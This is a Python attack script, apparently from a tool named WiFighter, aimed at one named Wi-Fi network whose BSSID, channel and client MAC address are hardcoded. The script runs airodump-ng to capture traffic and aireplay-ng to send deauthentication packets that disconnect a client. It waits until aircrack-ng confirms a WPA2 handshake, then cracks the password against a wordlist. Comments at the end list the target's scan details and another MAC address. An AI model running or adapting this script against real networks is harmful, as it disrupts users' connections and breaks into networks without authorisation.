#!venv/bin/python

import os, subprocess, time
import multiprocessing
import psutil

# Get the full path of wifighter dir
wifighter_path = os.path.dirname(os.path.abspath(__file__))

interface = "wlp1s0"

ssid = "Struhar_2.4GHz"
bssid = "40:ed:00:17:e0:d8"
channel = "8"

client_mac = "02:26:02:03:25:e0"
deauth_type = "client"

output_dir = f"{wifighter_path}/attacks/{ssid}"


def list_files(directory): 
    return set(os.listdir(directory))

def cap_file(files_before, files_after):
    new_files = files_after - files_before

    for filename in new_files:
        if '.cap' in filename:
            return filename  

def create_cap_dir(ssid):
    if ssid:
        if os.path.exists(f'{wifighter_path}/attacks/{ssid}'):
            pass
        else:
            print(f'Creating capture directory -> WiFighter/attacks/{ssid}')
            os.system(f'mkdir {wifighter_path}/attacks/{ssid}')
            print()       

def kill_airodump_processes():
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'] == 'airodump-ng':
                print(f"Killing process {proc.info['pid']} ({proc.info['name']})")
                proc.terminate()
                proc.wait()
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

# Run airodump-ng
def run_airodump(interface, bssid, channel, output_dir):
    if interface and bssid and channel and output_dir:
        command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
        subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

# Run aireplay-ng
def run_aireplay(interface, bssid, client_mac, deauth_type):
    if interface and bssid and deauth_type:
        if deauth_type == "client":
            if client_mac:
                command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, '-c', client_mac, interface]
                subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                print(f"[1] Deauth packet send to client {client_mac}")
        elif deauth_type == "broadcast":
            command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
            subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print(f"[1] Deauth packet send to broadcast")


create_cap_dir(ssid) # Create capture dir if not exist

# Define processes
capture_handshake = multiprocessing.Process(target = run_airodump, args=(interface, bssid, channel, output_dir))
deauth_client = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, client_mac, deauth_type))

files_before = list_files(output_dir) # Get files before airodump-ng adds new

# Listen for handshake
capture_handshake.start() # Start airodump-ng process
time.sleep(2)

# Deauth client/s
deauth_client.start() # Start aireplay-ng process
deauth_client.join() # Wait for the process to stop

files_after = list_files(output_dir) # Get files after airodump-ng adds new
output_file = cap_file(files_before, files_after) # Determine output_file in which airodump-ng stores

# Wait and verify that handshake was captured successfuly
captured = False
print('[2] Waiting for handshake...')
print(f'- Capture file will be saved -> WiFighter/attacks/{ssid}/{output_file} -')
while not captured:
    if os.path.exists(f"{output_dir}/{output_file}"):
        command = ['sudo', 'aircrack-ng', f'{output_dir}/{output_file}']
        verify = subprocess.Popen(command, stdout=subprocess.PIPE, text=True)
        output = str(verify.communicate())
        if "(0 handshake)" not in output and "Unknown" not in output and "No networks found, exiting." not in output:
            print("[3] Handshake/s captured!")
            captured = True
    time.sleep(1)


kill_airodump_processes() # Kill all airodump-ng processes

os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{output_file}") # Crack password




#  {'SSID': 'Struhar 2.4GHz', 'BSSID': '40:ed:00:17:e0:d8', 'Channel': '8', 'Signal': '-47', 'Band': '2.4 GHz', 'Encryption': 'WPA2', 'Auth': 'PSK', 'Cipher': 'CCMP'}

#  2C:BE:EB:80:DE:7A
#  -81203666-
